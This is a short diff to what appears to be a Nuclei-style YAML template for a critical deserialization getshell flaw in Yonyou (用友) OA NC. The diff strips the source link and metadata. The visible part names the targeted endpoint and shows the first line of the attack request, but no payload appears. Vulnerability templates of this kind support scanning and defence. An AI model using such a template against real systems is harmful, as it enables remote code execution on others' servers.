@@ -3,12 +3,8 @@ info:
   name: 用友 OA nc 反序列化漏洞getshell
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sbso0ut9s6bgs3vm'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sbso0ut9s6bgs3vm
-    fofa: 暂无
 http:
 - raw:
   - 'GET /servlet/monitorservlet HTTP/1.1
